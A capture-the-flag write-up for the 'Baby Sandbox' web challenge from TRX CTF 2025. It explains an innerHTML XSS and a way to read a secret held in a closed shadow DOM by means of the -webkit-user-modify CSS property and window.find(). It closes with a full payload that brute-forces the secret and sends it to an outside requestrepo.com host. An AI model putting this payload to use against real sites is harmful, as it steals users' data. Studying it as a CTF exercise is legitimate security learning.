---
layout: post
author: hofill
title: "Baby Sandbox"
slug: baby-sandbox
ctf: TRX CTF 2025
category: writeup
writeup_categories: ["web"]
tags: ["web", "xss", "shadow-dom", "css"]
summary: Exfiltrate data inside a closed shadow DOM using the deprecated -webkit-user-modify CSS property.
last_modified_at:
---

# Flag

> `TRX{1_l0v3_d3pr3c4t3d_f34tur3s_1_h0p3_y0u_d0_t00}`

# Summary

Exfiltrate data inside of a closed shadow element by using `-webkit-user-modify: read-write`.

# Details

We had an innerHTML XSS. The payload was converted to HTML entities, but since it used `innerHTML` directly:

```js
d.innerHTML = "<%= payload %>";
```

We could encode our payload in hex and bypass the entity encoding entirely.

The flag was written into a `<span>` inside a **closed** Shadow DOM:

```js
let container = document.getElementById("secret-container");
let secretDiv = document.createElement("div");
let shadow = secretDiv.attachShadow({ mode: "closed" });

let flagElement = document.createElement("span");
flagElement.textContent =
  localStorage.getItem("secret") || "TRX{fake_flag_for_testing}";
shadow.appendChild(flagElement);
```

A closed shadow root means the element isn't accessible via JavaScript — `document.querySelector` can't pierce it, and there's no reference to the shadow root exposed.

The trick: the deprecated CSS property `-webkit-user-modify: read-write` makes the content editable inside the shadow, which causes `window.find()` to be able to search through it. From there, we can bruteforce the flag character by character.

> We noticed that if fast enough, `find()` would work on page load without the CSS property — but it only gave us one character.

Final payload:

```js
<img src=x onerror="
  document.querySelector('#secret-container').childNodes[0].style='-webkit-user-modify: read-write';
  let alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}';
  found='TRX{';
  for(let i=0;i<100;i++){
    for(let c=0;c<64;c++){
      if(find(found+alphabet[c],true,false,true)){
        found+=alphabet[c];
        break;
      }
    }
  };
  parent.window.open('https://75okok76.requestrepo.com/?c='+encodeURIComponent(found),'_top')
">
```

# Resources

- [https://blog.ankursundara.com/shadow-dom/](https://blog.ankursundara.com/shadow-dom/)
- [https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md)
